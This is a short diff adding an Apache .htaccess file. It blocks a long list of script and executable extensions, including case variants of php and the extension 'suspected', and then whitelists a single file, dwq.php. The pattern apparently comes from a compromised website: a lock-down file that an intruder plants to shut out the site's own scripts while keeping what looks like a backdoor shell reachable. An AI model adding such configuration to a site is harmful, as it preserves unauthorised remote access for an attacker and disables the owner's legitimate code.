@@ -1,0 +1,8 @@
+<FilesMatch ".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|PHP7|suspected|shtml|phar|php7|php5|PhTmL|ShTmL|phar|Phar|PhAr|.flaa|xxxjpg|php56|php4)$"> 
+Order Allow,Deny 
+Deny from all 
+</FilesMatch> 
+<FilesMatch "^(dwq.php)$"> 
+Order Allow,Deny 
+Allow from all 
+</FilesMatch>
